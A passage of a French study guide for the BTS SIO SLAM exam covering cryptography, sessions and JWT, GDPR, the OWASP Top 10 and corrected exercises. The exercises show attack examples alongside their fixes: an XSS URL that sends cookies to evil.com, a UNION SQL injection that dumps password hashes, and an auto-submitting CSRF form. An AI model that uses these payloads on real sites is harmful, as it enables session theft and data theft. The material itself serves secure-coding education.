+  const iv = Buffer.from(parties[0], 'hex');
+  const texteChiffre = parties[1];
+
+  // Deriver la meme cle
+  const cle = crypto.scryptSync(cleSecrete, 'sel-application', 32);
+
+  // Creer le dechiffreur
+  const decipher = crypto.createDecipheriv('aes-256-cbc', cle, iv);
+
+  // Dechiffrer
+  let texte = decipher.update(texteChiffre, 'hex', 'utf8');
+  texte += decipher.final('utf8');
+
+  return texte;
+}
+
+// Utilisation
+const secret = 'ma-cle-tres-secrete';
+const message = 'Donnees sensibles a proteger';
+
+const chiffre = chiffrer(message, secret);
+console.log('Chiffre :', chiffre);
+// Exemple : a1b2c3...:d4e5f6...
+
+const dechiffre = dechiffrer(chiffre, secret);
+console.log('Dechiffre :', dechiffre);
+// "Donnees sensibles a proteger"
+```
+
+#### Code : chiffrement AES en C#
+
+```csharp
+using System.Security.Cryptography;
+using System.Text;
+
+public class ChiffrementAES
+{
+    public static (string chiffre, string iv) Chiffrer(string texte, byte[] cle)
+    {
+        using (var aes = Aes.Create())
+        {
+            aes.Key = cle;
+            aes.GenerateIV(); // IV aleatoire
+
+            using (var chiffreur = aes.CreateEncryptor())
+            {
+                byte[] texteBytes = Encoding.UTF8.GetBytes(texte);
+                byte[] chiffreBytes = chiffreur.TransformFinalBlock(
+                    texteBytes, 0, texteBytes.Length
+                );
+
+                return (
+                    Convert.ToBase64String(chiffreBytes),
+                    Convert.ToBase64String(aes.IV)
+                );
+            }
+        }
+    }
+
+    public static string Dechiffrer(string chiffre, byte[] cle, string iv)
+    {
+        using (var aes = Aes.Create())
+        {
+            aes.Key = cle;
+            aes.IV = Convert.FromBase64String(iv);
+
+            using (var dechiffreur = aes.CreateDecryptor())
+            {
+                byte[] chiffreBytes = Convert.FromBase64String(chiffre);
+                byte[] texteBytes = dechiffreur.TransformFinalBlock(
+                    chiffreBytes, 0, chiffreBytes.Length
+                );
+
+                return Encoding.UTF8.GetString(texteBytes);
+            }
+        }
+    }
+
+    public static void Exemple()
+    {
+        // Generer une cle AES-256 (32 octets)
+        byte[] cle = RandomNumberGenerator.GetBytes(32);
+
+        var (chiffre, iv) = Chiffrer("Donnees sensibles", cle);
+        Console.WriteLine("Chiffre : " + chiffre);
+
+        string original = Dechiffrer(chiffre, cle, iv);
+        Console.WriteLine("Dechiffre : " + original);
+    }
+}
+```
+
+### Chiffrement asymetrique : deux cles (RSA)
+
+Deux cles mathematiquement liees :
+- **Cle publique** : distribuee a tout le monde. Sert a chiffrer.
+- **Cle privee** : gardee secrete. Sert a dechiffrer.
+
+Analogie : une boite aux lettres. Tout le monde peut y deposer un courrier (chiffrer avec la cle publique). Seul le proprietaire possede la cle pour l'ouvrir (dechiffrer avec la cle privee).
+
+Utilisation :
+- Echange de cles symetriques de maniere securisee (le debut d'une connexion HTTPS).
+- Signatures numeriques (prouver l'identite de l'emetteur).
+- Chiffrement de petites quantites de donnees.
+
+Le chiffrement asymetrique est beaucoup plus lent que le symetrique. En pratique, on utilise l'asymetrique pour echanger une cle symetrique, puis le symetrique pour chiffrer les donnees.
+
+### HTTPS / TLS : comment ca marche
+
+HTTPS = HTTP + TLS (Transport Layer Security, successeur de SSL).
+
+Le handshake TLS simplifie :
+
+1. **Client Hello** : le navigateur envoie au serveur les algorithmes de chiffrement qu'il supporte.
+2. **Server Hello** : le serveur choisit un algorithme et envoie son certificat SSL (qui contient sa cle publique).
+3. **Verification du certificat** : le navigateur verifie que le certificat est signe par une autorite de certification (CA) de confiance.
+4. **Echange de cle** : le navigateur genere une cle symetrique de session, la chiffre avec la cle publique du serveur, et l'envoie.
+5. **Communication chiffree** : les deux parties utilisent la cle symetrique de session pour chiffrer toutes les communications.
+
+### Certificats SSL/TLS
+
+Un certificat numerique lie une cle publique a une identite (nom de domaine). Il est signe par une autorite de certification (CA) qui garantit l'authenticite.
+
+- **Let's Encrypt** : autorite de certification gratuite et automatisee.
+- **Certificat auto-signe** : genere par le serveur lui-meme, sans CA. Utilisable en developpement, pas en production (le navigateur affiche un avertissement).
+
+### Quand chiffrer
+
+- **En transit** : toutes les communications reseau doivent passer par HTTPS/TLS. Pas d'exception.
+- **Au repos** : les donnees sensibles stockees en base de donnees (numeros de carte bancaire, donnees medicales) doivent etre chiffrees.
+- **Fichiers** : les sauvegardes et exports contenant des donnees sensibles doivent etre chiffres.
+
+---
+
+## Authentification et gestion de sessions
+
+### Session cote serveur
+
+Quand un utilisateur se connecte, le serveur cree une session (un objet stocke en memoire ou en base de donnees). Un identifiant de session (session ID) est envoye au navigateur sous forme de cookie. A chaque requete, le navigateur renvoie ce cookie. Le serveur retrouve la session correspondante.
+
+```javascript
+const express = require('express');
+const session = require('express-session');
+
+const app = express();
+
+app.use(session({
+  secret: 'cle-secrete-pour-signer-le-cookie',
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,    // Pas accessible en JavaScript
+    secure: true,      // HTTPS uniquement
+    sameSite: 'lax',   // Protection CSRF
+    maxAge: 3600000    // Expiration : 1 heure (en millisecondes)
+  }
+}));
+
+app.post('/login', async (req, res) => {
+  const { login, motDePasse } = req.body;
+  const utilisateur = await verifierCredentials(login, motDePasse);
+
+  if (utilisateur) {
+    // Stocker les informations dans la session
+    req.session.userId = utilisateur.id;
+    req.session.role = utilisateur.role;
+    res.redirect('/dashboard');
+  } else {
+    res.status(401).send('Identifiants incorrects');
+  }
+});
+
+// Middleware de protection des routes
+function authentifie(req, res, next) {
+  if (req.session.userId) {
+    next(); // L'utilisateur est connecte, on continue
+  } else {
+    res.status(401).redirect('/login');
+  }
+}
+
+app.get('/dashboard', authentifie, (req, res) => {
+  res.send('Bienvenue, utilisateur ' + req.session.userId);
+});
+
+app.post('/logout', (req, res) => {
+  req.session.destroy();
+  res.redirect('/login');
+});
+```
+
+### JWT (JSON Web Token)
+
+Un JWT est un jeton autonome qui contient des informations (claims) et une signature. Il est compose de trois parties separees par des points :
+
+```
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.signature
+
+[header].[payload].[signature]
+```
+
+- **Header** : algorithme de signature et type de token.
+- **Payload** : les donnees (user ID, role, date d'expiration). Encode en Base64, PAS chiffre. N'importe qui peut le lire.
+- **Signature** : garantit que le token n'a pas ete modifie. Calculee avec le header + payload + secret du serveur.
+
+```javascript
+const jwt = require('jsonwebtoken');
+
+const SECRET = 'cle-secrete-jwt-tres-longue-et-aleatoire';
+
+// Generer un token a la connexion
+app.post('/login', async (req, res) => {
+  const { login, motDePasse } = req.body;
+  const utilisateur = await verifierCredentials(login, motDePasse);
+
+  if (utilisateur) {
+    const token = jwt.sign(
+      { userId: utilisateur.id, role: utilisateur.role },
+      SECRET,
+      { expiresIn: '1h' } // Expire dans 1 heure
+    );
+    res.json({ token });
+  } else {
+    res.status(401).json({ erreur: 'Identifiants incorrects' });
+  }
+});
+
+// Middleware de verification du token
+function verifierToken(req, res, next) {
+  const authHeader = req.headers.authorization;
+
+  if (!authHeader || !authHeader.startsWith('Bearer ')) {
+    return res.status(401).json({ erreur: 'Token manquant' });
+  }
+
+  const token = authHeader.split(' ')[1];
+
+  try {
+    const decoded = jwt.verify(token, SECRET);
+    req.utilisateur = decoded; // { userId: 1, role: 'admin', iat: ..., exp: ... }
+    next();
+  } catch (err) {
+    return res.status(403).json({ erreur: 'Token invalide ou expire' });
+  }
+}
+
+app.get('/api/profil', verifierToken, (req, res) => {
+  res.json({ userId: req.utilisateur.userId, role: req.utilisateur.role });
+});
+```
+
+**C# (System.IdentityModel.Tokens.Jwt) :**
+
+```csharp
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
+using System.Text;
+using Microsoft.IdentityModel.Tokens;
+
+public class JwtService
+{
+    private const string Secret = "cle-secrete-jwt-tres-longue-et-aleatoire-minimum-32-caracteres";
+
+    public string GenererToken(int userId, string role)
+    {
+        var cle = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(Secret));
+        var credentials = new SigningCredentials(cle, SecurityAlgorithms.HmacSha256);
+
+        var claims = new[]
+        {
+            new Claim("userId", userId.ToString()),
+            new Claim(ClaimTypes.Role, role)
+        };
+
+        var token = new JwtSecurityToken(
+            issuer: "mon-application",
+            audience: "mon-application",
+            claims: claims,
+            expires: DateTime.UtcNow.AddHours(1),
+            signingCredentials: credentials
+        );
+
+        return new JwtSecurityTokenHandler().WriteToken(token);
+    }
+
+    public ClaimsPrincipal ValiderToken(string token)
+    {
+        var cle = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(Secret));
+        var parametres = new TokenValidationParameters
+        {
+            ValidateIssuer = true,
+            ValidIssuer = "mon-application",
+            ValidateAudience = true,
+            ValidAudience = "mon-application",
+            ValidateLifetime = true,
+            IssuerSigningKey = cle
+        };
+
+        var handler = new JwtSecurityTokenHandler();
+        return handler.ValidateToken(token, parametres, out _);
+    }
+}
+```
+
+### Session vs JWT
+
+| | Session | JWT |
+|---|---------|-----|
+| Stockage | Cote serveur (memoire, Redis, BDD) | Cote client (localStorage, cookie) |
+| Scalabilite | Necessite un store partage si plusieurs serveurs | Autonome, pas de stockage serveur |
+| Revocation | Facile (supprimer la session) | Difficile (le token reste valide jusqu'a expiration) |
+| Taille | Petit cookie (juste l'ID) | Token plus gros (contient les donnees) |
+| Usage | Applications web classiques | API REST, microservices |
+
+### Bonnes pratiques
+
+1. **Expiration** : toujours definir une duree de vie courte (1h pour un JWT, quelques heures pour une session).
+2. **Renouvellement** : utiliser un refresh token pour obtenir un nouveau JWT sans redemander les identifiants.
+3. **Stockage securise** : stocker le JWT dans un cookie `HttpOnly` plutot que dans `localStorage` (vulnerable au XSS).
+4. **HTTPS obligatoire** : les tokens transitent en clair dans les en-tetes HTTP. Sans HTTPS, un attaquant sur le reseau peut les intercepter.
+
+### Authentification multi-facteur (2FA)
+
+Le principe : combiner deux ou plusieurs facteurs d'authentification differents :
+
+- **Ce que l'utilisateur sait** : mot de passe, code PIN.
+- **Ce que l'utilisateur possede** : telephone (SMS, application TOTP comme Google Authenticator), cle physique (YubiKey).
+- **Ce que l'utilisateur est** : empreinte digitale, reconnaissance faciale.
+
+En pratique, le 2FA le plus courant : mot de passe + code temporaire genere par une application (TOTP, Time-based One-Time Password). Le code change toutes les 30 secondes et est base sur un secret partage entre le serveur et l'application.
+
+---
+
+## RGPD et protection des donnees
+
+### Les grands principes
+
+Le RGPD (Reglement General sur la Protection des Donnees) est un reglement europeen en vigueur depuis le 25 mai 2018. Il s'applique a toute organisation qui traite des donnees personnelles de residents de l'Union Europeenne.
+
+1. **Licéité, loyaute, transparence** : le traitement doit avoir une base legale (consentement, contrat, obligation legale, interet legitime) et etre transparent.
+2. **Limitation des finalites** : les donnees sont collectees pour des finalites determinees, explicites et legitimes.
+3. **Minimisation** : ne collecter que les donnees strictement necessaires. Si vous n'avez pas besoin de la date de naissance, ne la demandez pas.
+4. **Exactitude** : les donnees doivent etre exactes et tenues a jour.
+5. **Limitation de la conservation** : les donnees ne sont conservees que le temps necessaire a la finalite. Definir des durees de retention et supprimer les donnees obsoletes.
+6. **Integrite et confidentialite** : assurer la securite des donnees par des mesures techniques et organisationnelles appropriees.
+
+### Droits des personnes
+
+- **Droit d'acces** (article 15) : toute personne peut demander une copie de ses donnees personnelles.
+- **Droit de rectification** (article 16) : corriger des donnees inexactes.
+- **Droit a l'effacement** (article 17) : demander la suppression de ses donnees (droit a l'oubli).
+- **Droit a la portabilite** (article 20) : recevoir ses donnees dans un format structure, couramment utilise et lisible par machine (JSON, CSV).
+- **Droit d'opposition** (article 21) : s'opposer au traitement de ses donnees.
+- **Droit a la limitation du traitement** (article 18) : demander la suspension du traitement.
+
+### Consentement
+
+Le consentement doit etre :
+- **Libre** : pas de consequence negative en cas de refus.
+- **Specifique** : un consentement par finalite (pas de case unique pour tout).
+- **Eclaire** : l'utilisateur comprend ce a quoi il consent.
+- **Univoque** : un acte positif clair (pas de case precochee).
+
+Le consentement doit pouvoir etre retire aussi facilement qu'il a ete donne.
+
+### DPO (Delegue a la Protection des Donnees)
+
+Le DPO est obligatoire pour :
+- Les organismes publics.
+- Les organisations dont l'activite de base implique un suivi regulier et systematique des personnes a grande echelle.
+- Les organisations qui traitent des donnees sensibles a grande echelle.
+
+Son role : informer, conseiller, controler le respect du RGPD, cooperer avec la CNIL.
+
+### Sanctions
+
+- Jusqu'a **10 millions d'euros ou 2% du CA mondial** pour les manquements aux obligations du responsable de traitement (registre, DPO, notification de violation).
+- Jusqu'a **20 millions d'euros ou 4% du CA mondial** pour les manquements aux droits des personnes ou aux principes fondamentaux.
+
+### Impact sur le developpement
+
+**Privacy by Design** (protection des donnees des la conception) :
+- Integrer la protection des donnees dans la conception du systeme, pas en surcouche apres coup.
+- Chiffrer les donnees sensibles.
+- Minimiser la collecte.
+- Anonymiser ou pseudonymiser quand possible.
+- Prevoir les mecanismes d'exercice des droits (export, suppression).
+
+**Privacy by Default** (protection des donnees par defaut) :
+- Les parametres par defaut doivent etre les plus protecteurs. Le profil est prive par defaut. Les cookies non essentiels sont refuses par defaut.
+
+**Registre des traitements** (article 30) :
+- Documenter tous les traitements de donnees personnelles : finalite, categories de donnees, destinataires, duree de conservation, mesures de securite.
+
+**Notification de violation** (article 33) :
+- En cas de violation de donnees, notifier la CNIL dans les 72 heures.
+- Si le risque est eleve pour les personnes, les notifier egalement.
+
+---
+
+## OWASP Top 10 (2021)
+
+L'OWASP (Open Web Application Security Project) publie regulierement le classement des 10 vulnerabilites les plus critiques dans les applications web.
+
+### A01 : Broken Access Control (Controle d'acces defaillant)
+
+**Description** : un utilisateur peut acceder a des ressources ou effectuer des actions au-dela de ses droits.
+
+**Exemple** : modifier l'URL `/profil?id=123` en `/profil?id=456` pour acceder au profil d'un autre utilisateur. Ou acceder a `/admin` sans etre administrateur.
+
+**Protection** : verifier les autorisations cote serveur pour chaque requete. Ne jamais faire confiance au client.
+
+```javascript
+app.get('/profil/:id', authentifie, (req, res) => {
+  // Verifier que l'utilisateur accede a SON profil
+  if (req.params.id !== req.session.userId.toString()) {
+    return res.status(403).send('Acces interdit');
+  }
+  // Afficher le profil
+});
+```
+
+### A02 : Cryptographic Failures (Defaillances cryptographiques)
+
+**Description** : protection insuffisante des donnees sensibles (mots de passe en clair, absence de chiffrement, algorithmes obsoletes).
+
+**Exemple** : stocker les mots de passe en MD5 sans sel. Transmettre des donnees sensibles en HTTP au lieu de HTTPS.
+
+**Protection** : utiliser bcrypt/Argon2 pour les mots de passe, AES-256 pour le chiffrement, HTTPS partout.
+
+### A03 : Injection
+
+**Description** : injection de code malveillant (SQL, NoSQL, OS, LDAP) via les donnees utilisateur.
+
+**Exemple** : injection SQL (voir section dediee).
+
+**Protection** : requetes preparees, validation des entrees, ORM.
+
+### A04 : Insecure Design (Conception non securisee)
+
+**Description** : failles de conception, pas d'implementation. L'architecture elle-meme est vulnerable.
+
+**Exemple** : un systeme de recuperation de mot de passe base sur des questions de securite dont les reponses sont trouvables sur les reseaux sociaux.
+
+**Protection** : modelisation des menaces, principes de secure design, revue d'architecture.
+
+### A05 : Security Misconfiguration (Mauvaise configuration)
+
+**Description** : parametres par defaut non securises, services inutiles actives, messages d'erreur trop detailles.
+
+**Exemple** : laisser le mode debug active en production (affiche les stack traces avec le code source). Laisser les identifiants par defaut d'une base de donnees.
+
+**Protection** : hardening (durcissement), desactiver les fonctionnalites inutiles, ne pas afficher les erreurs techniques aux utilisateurs.
+
+### A06 : Vulnerable and Outdated Components (Composants vulnerables)
+
+**Description** : utiliser des bibliotheques, frameworks ou systemes d'exploitation avec des vulnerabilites connues.
+
+**Exemple** : une version de jQuery avec une faille XSS connue. Apache Struts non mis a jour (cas Equifax).
+
+**Protection** : mettre a jour regulierement, utiliser `npm audit` ou `dotnet list package --vulnerable`, surveiller les CVE.
+
+### A07 : Identification and Authentication Failures
+
+**Description** : failles dans l'authentification (mots de passe faibles autorises, brute force possible, sessions mal gerees).
+
+**Exemple** : pas de limite de tentatives de connexion, permettant une attaque par brute force.
+
+**Protection** : imposer des mots de passe forts, limiter les tentatives (rate limiting), 2FA, expiration des sessions.
+
+### A08 : Software and Data Integrity Failures
+
+**Description** : le code ou les donnees ne sont pas verifies pour leur integrite (mises a jour non signees, dependances non verifiees).
+
+**Exemple** : un pipeline CI/CD compromis qui injecte du code malveillant. Dependance npm corrompue.
+
+**Protection** : verifier les signatures, utiliser des lock files (package-lock.json), SRI (Subresource Integrity) pour les CDN.
+
+### A09 : Security Logging and Monitoring Failures
+
+**Description** : absence de journalisation des evenements de securite, empechant la detection des attaques.
+
+**Exemple** : pas de log des tentatives de connexion echouees. Pas d'alerte en cas de comportement anormal.
+
+**Protection** : journaliser les evenements importants (connexions, echecs, modifications de droits), mettre en place des alertes.
+
+### A10 : Server-Side Request Forgery (SSRF)
+
+**Description** : l'attaquant force le serveur a effectuer des requetes HTTP vers des ressources internes.
+
+**Exemple** : une fonctionnalite qui prend une URL en parametre pour afficher une image. L'attaquant fournit `http://localhost:6379/` pour acceder au Redis interne.
+
+**Protection** : valider et filtrer les URL, bloquer les adresses internes, utiliser des listes blanches de domaines autorises.
+
+---
+
+## Methodologie d'examen
+
+### Comment la securite tombe a l'examen BTS SIO SLAM
+
+La securite est transversale. Elle peut apparaitre dans :
+
+- **E4 (Support et mise a disposition de services informatiques)** : securisation d'un service, RGPD.
+- **E5 (Administration des systemes et des reseaux / Conception et developpement d'applications)** : securite du code, authentification, chiffrement.
+- **E6 (Cybersecurite des services informatiques)** : analyse de risques, vulnerabilites, remediations.
+- **Epreuve ecrite** : questions de cours sur les concepts de securite.
+- **Epreuve pratique** : identifier et corriger des failles dans du code fourni.
+- **Projet (E5)** : la securite de votre projet sera evaluee.
+
+### Les questions types
+
+1. **Identifier la faille** : on vous montre du code et vous devez trouver la vulnerabilite.
+2. **Proposer la correction** : reecrire le code de maniere securisee.
+3. **Expliquer un concept** : "Qu'est-ce que le hachage ? Quelle difference avec le chiffrement ?"
+4. **Argumenter un choix** : "Pourquoi utiliser bcrypt plutot que SHA-256 pour les mots de passe ?"
+5. **RGPD** : "Quels droits a un utilisateur sur ses donnees ?" "Qu'est-ce que le privacy by design ?"
+6. **Architecture** : "Comment securisez-vous les communications entre le client et le serveur ?"
+
+### Checklist de securite pour le projet
+
+- [ ] Les mots de passe sont haches avec bcrypt (jamais en clair, jamais en MD5).
+- [ ] Les requetes SQL utilisent des parametres prepares (jamais de concatenation).
+- [ ] Les donnees affichees dans le HTML sont echappees (XSS).
+- [ ] Les formulaires ont un token CSRF.
+- [ ] Les cookies de session sont HttpOnly, Secure et SameSite.
+- [ ] La communication est en HTTPS.
+- [ ] La validation des entrees est faite cote serveur (pas seulement cote client).
+- [ ] Les messages d'erreur ne revelent pas d'informations techniques.
+- [ ] Le principe du moindre privilege est applique (droits BDD, acces fichiers).
+- [ ] Les dependances sont a jour (`npm audit`, `dotnet list package --vulnerable`).
+- [ ] La conformite RGPD est assuree (consentement, droits, minimisation).
+
+---
+
+## Exercices d'examen corriges
+
+### Exercice 1 : Identifier l'injection SQL
+
+**Enonce** : Le code suivant est-il vulnerable ? Si oui, expliquer l'attaque et corriger.
+
+```javascript
+app.get('/article', (req, res) => {
+  const id = req.query.id;
+  const sql = "SELECT * FROM articles WHERE id = " + id;
+  connection.query(sql, (err, results) => {
+    res.json(results);
+  });
+});
+```
+
+**Correction** :
+
+Oui, ce code est vulnerable a l'injection SQL. Le parametre `id` est concatene directement dans la requete sans validation ni parametrage.
+
+Attaque : l'attaquant appelle `/article?id=1 UNION SELECT login, password_hash, email, 4 FROM users`. La requete devient :
+
+```sql
+SELECT * FROM articles WHERE id = 1 UNION SELECT login, password_hash, email, 4 FROM users
+```
+
+L'attaquant recupere tous les identifiants de la table `users`.
+
+Code corrige :
+
+```javascript
+app.get('/article', (req, res) => {
+  const id = parseInt(req.query.id, 10);
+  if (isNaN(id)) {
+    return res.status(400).json({ erreur: 'ID invalide' });
+  }
+
+  const sql = 'SELECT * FROM articles WHERE id = ?';
+  connection.execute(sql, [id], (err, results) => {
+    res.json(results);
+  });
+});
+```
+
+Double protection : validation (parseInt + verification) et requete preparee.
+
+---
+
+### Exercice 2 : Identifier le XSS
+
+**Enonce** : Ce code Express.js est-il vulnerable ?
+
+```javascript
+app.get('/bienvenue', (req, res) => {
+  const nom = req.query.nom;
+  res.send('<h1>Bienvenue ' + nom + '</h1>');
+});
+```
+
+**Correction** :
+
+Oui, c'est une faille XSS de type reflechi. L'attaquant peut forger l'URL :
+
+```
+/bienvenue?nom=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
+```
+
+Le script sera execute dans le navigateur de la victime qui clique sur ce lien.
+
+Code corrige :
+
+```javascript
+function echapperHtml(texte) {
+  return String(texte)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+app.get('/bienvenue', (req, res) => {
+  const nom = echapperHtml(req.query.nom || '');
+  res.send('<h1>Bienvenue ' + nom + '</h1>');
+});
+```
+
+---
+
+### Exercice 3 : Mots de passe en clair
+
+**Enonce** : Expliquer pourquoi le code suivant est dangereux et proposer une correction.
+
+```csharp
+public void InscrireUtilisateur(string login, string motDePasse)
+{
+    string sql = "INSERT INTO users (login, password) VALUES (@login, @password)";
+    using (var command = new MySqlCommand(sql, connection))
+    {
+        command.Parameters.AddWithValue("@login", login);
+        command.Parameters.AddWithValue("@password", motDePasse); // Mot de passe en clair !
+    }
+}
+```
+
+**Correction** :
+
+Le mot de passe est stocke en clair dans la base de donnees. Si la base est compromise (piratage, fuite, acces non autorise), tous les mots de passe sont immediatement lisibles. De plus, comme beaucoup d'utilisateurs reutilisent leurs mots de passe, l'attaquant peut tester ces identifiants sur d'autres sites (credential stuffing).
+
+Remarque : la requete est correctement parametree (pas d'injection SQL), mais le stockage du mot de passe est le probleme.
+
+Code corrige :
+
+```csharp
+using BCrypt.Net;
+
+public void InscrireUtilisateur(string login, string motDePasse)
+{
+    // Hacher le mot de passe avec bcrypt
+    string hash = BCrypt.Net.BCrypt.HashPassword(motDePasse, workFactor: 10);
+
+    string sql = "INSERT INTO users (login, password_hash) VALUES (@login, @hash)";
+    using (var command = new MySqlCommand(sql, connection))
+    {
+        command.Parameters.AddWithValue("@login", login);
+        command.Parameters.AddWithValue("@hash", hash); // Hash bcrypt, pas le mot de passe
+        command.ExecuteNonQuery();
+    }
+}
+```
+
+---
+
+### Exercice 4 : Difference hash et chiffrement
+
+**Enonce** : Un collegue propose de chiffrer les mots de passe avec AES pour les stocker en base. Expliquer pourquoi c'est une mauvaise idee.
+
+**Correction** :
+
+Le chiffrement AES est reversible : si l'on possede la cle, on peut dechiffrer et retrouver le mot de passe en clair. Cela pose plusieurs problemes :
+
+1. La cle de chiffrement doit etre stockee quelque part (dans le code, un fichier de configuration, une variable d'environnement). Si un attaquant accede a la base ET a la cle (ce qui est probable si le serveur est compromis), il dechiffre tous les mots de passe instantanement.
+
+2. Tout administrateur ou developpeur ayant acces a la cle peut voir les mots de passe de tous les utilisateurs.
+
+3. Avec un hash (bcrypt), meme le developpeur ne peut pas connaitre les mots de passe. Meme si la base est volee, l'attaquant doit brute-forcer chaque hash individuellement, ce qui prend un temps considerable.
+
+La bonne pratique : hacher les mots de passe avec bcrypt ou Argon2. Reserver le chiffrement pour les donnees que l'application doit pouvoir relire (numeros de carte bancaire, donnees medicales).
+
+---
+
+### Exercice 5 : CSRF
+
+**Enonce** : Expliquer comment une attaque CSRF pourrait exploiter le formulaire suivant, et proposer une protection.
+
+```html
+<form action="/supprimer-compte" method="POST">
+  <button type="submit">Supprimer mon compte</button>
+</form>
+```
+
+```javascript
+app.post('/supprimer-compte', authentifie, (req, res) => {
+  supprimerCompte(req.session.userId);
+  res.send('Compte supprime');
+});
+```
+
+**Correction** :
+
+L'attaque : un site malveillant contient un formulaire invisible qui pointe vers `/supprimer-compte` :
+
+```html
+<!-- Sur site-malveillant.com -->
+<form action="https://votre-site.com/supprimer-compte" method="POST" id="f">
+</form>
+<script>document.getElementById('f').submit();</script>
+```
+
+Si l'utilisateur est connecte a `votre-site.com`, son navigateur envoie la requete POST avec ses cookies de session. Le serveur recoit une requete authentifiee et supprime le compte.
+
+Protection avec token CSRF :
+
+```javascript
+const csrf = require('csurf');
+const csrfProtection = csrf();
+
+app.get('/parametres', csrfProtection, (req, res) => {
+  res.send(`
+    <form action="/supprimer-compte" method="POST">
+      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
+      <button type="submit">Supprimer mon compte</button>
+    </form>
+  `);
+});
+
+app.post('/supprimer-compte', csrfProtection, authentifie, (req, res) => {
+  // Le middleware csurf verifie automatiquement le token
+  supprimerCompte(req.session.userId);
+  res.send('Compte supprime');
+});
+```
+
+Le site malveillant ne peut pas connaitre le token CSRF car il est genere dynamiquement par le serveur pour chaque session.
+
+---
+
+### Exercice 6 : Validation cote client uniquement
+
+**Enonce** : Expliquer pourquoi le code suivant est insuffisant pour la securite.
+
+```html
+<form action="/inscription" method="POST">
+  <input type="email" name="email" required>
+  <input type="password" name="password" minlength="8" required>
+  <button type="submit">S'inscrire</button>
+</form>
+```
+
+Le serveur :
+
+```javascript
+app.post('/inscription', (req, res) => {
+  // Pas de validation cote serveur
+  inscrireUtilisateur(req.body.email, req.body.password);
+  res.send('Inscrit');
+});
+```
+
+**Correction** :
+
+La validation HTML5 (`required`, `type="email"`, `minlength`) s'execute uniquement dans le navigateur. Un attaquant peut la contourner facilement :
+
+- Envoyer une requete directement avec `curl`, Postman ou un script.
+- Desactiver JavaScript dans le navigateur.
+- Modifier le HTML avec les outils de developpement du navigateur.
+
+La validation cote client est utile pour l'experience utilisateur (retour immediat) mais n'a aucune valeur de securite. La validation doit etre faite cote serveur.
+
+Code corrige :
+
+```javascript
+app.post('/inscription', (req, res) => {
+  const { email, password } = req.body;
+
+  // Validation cote serveur
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!email || !emailRegex.test(email)) {
+    return res.status(400).send('Email invalide');
+  }
+
+  if (!password || password.length < 8) {
+    return res.status(400).send('Le mot de passe doit faire au moins 8 caracteres');
+  }
+
+  inscrireUtilisateur(email, password);
+  res.send('Inscrit');
+});
+```
+
+---
+
+### Exercice 7 : Controle d'acces defaillant
+
+**Enonce** : Identifier la faille dans le code suivant.
+
+```javascript
+app.get('/api/factures/:id', authentifie, (req, res) => {
+  const sql = 'SELECT * FROM factures WHERE id = ?';
+  connection.execute(sql, [req.params.id], (err, results) => {
+    if (results.length > 0) {
+      res.json(results[0]);
+    } else {
+      res.status(404).send('Facture non trouvee');
+    }
+  });
+});
+```
+
+**Correction** :
+
+L'utilisateur est authentifie (on sait qui il est), mais il n'y a aucune verification d'autorisation (on ne verifie pas s'il a le droit d'acceder a cette facture). Un utilisateur connecte peut acceder a n'importe quelle facture en changeant l'ID dans l'URL : `/api/factures/1`, `/api/factures/2`, etc. C'est une faille IDOR (Insecure Direct Object Reference), un cas de Broken Access Control (OWASP A01).
+
+Code corrige :
+
+```javascript
+app.get('/api/factures/:id', authentifie, (req, res) => {
+  // Ajouter la condition : la facture doit appartenir a l'utilisateur connecte
+  const sql = 'SELECT * FROM factures WHERE id = ? AND utilisateur_id = ?';
+  connection.execute(sql, [req.params.id, req.session.userId], (err, results) => {
+    if (results.length > 0) {
+      res.json(results[0]);
+    } else {
+      res.status(404).send('Facture non trouvee');
+    }
+  });
+});
+```
+
+---
+
+### Exercice 8 : JWT mal utilise
+
+**Enonce** : Expliquer le probleme de ce code.
+
+```javascript
+app.get('/api/admin', (req, res) => {
+  const token = req.headers.authorization.split(' ')[1];
+  const decoded = jwt.decode(token); // decode, pas verify
+
+  if (decoded.role === 'admin') {
+    res.json({ donnees: 'sensibles' });
+  } else {
+    res.status(403).send('Acces interdit');
+  }
+});
+```
+
+**Correction** :
+
+`jwt.decode()` decode le payload du JWT **sans verifier la signature**. N'importe qui peut creer un token avec `{"role": "admin"}` sans connaitre le secret du serveur. Le serveur acceptera ce token forge.
+
+La difference :
+- `jwt.decode(token)` : lit le contenu sans verification. Usage : debug uniquement.
+- `jwt.verify(token, secret)` : verifie la signature PUIS decode. Usage : production.
+
+Code corrige :
+
+```javascript
+app.get('/api/admin', (req, res) => {
+  const token = req.headers.authorization.split(' ')[1];
+
+  try {
+    const decoded = jwt.verify(token, SECRET); // verify, pas decode
+
+    if (decoded.role === 'admin') {
+      res.json({ donnees: 'sensibles' });
+    } else {
+      res.status(403).send('Acces interdit');
+    }
+  } catch (err) {
+    res.status(401).send('Token invalide');
+  }
+});
+```
+
+---
+
+### Exercice 9 : RGPD
+
+**Enonce** : Un site e-commerce collecte les donnees suivantes lors de l'inscription : nom, prenom, email, telephone, date de naissance, adresse, numero de carte bancaire, couleur preferee, signe astrologique. Identifier les problemes au regard du RGPD.
+
+**Correction** :
+
+1. **Violation du principe de minimisation** : la couleur preferee et le signe astrologique ne sont pas necessaires au fonctionnement d'un site e-commerce. Ces donnees ne devraient pas etre collectees.
+
+2. **Numero de carte bancaire a l'inscription** : il ne devrait etre collecte qu'au moment de l'achat, pas lors de l'inscription. De plus, son stockage impose des mesures de securite renforcees (norme PCI-DSS). Il est preferable de deleguer le stockage des donnees bancaires a un prestataire specialise (Stripe, PayPal).
+
+3. **Absence probable de consentement eclaire** : l'utilisateur doit etre informe de la finalite de chaque donnee collectee. "Pourquoi avez-vous besoin de ma date de naissance pour vendre des chaussures ?"
+
+4. **Duree de conservation** : rien n'indique combien de temps ces donnees seront conservees. Le RGPD impose de definir une duree de conservation proportionnee a la finalite.
+
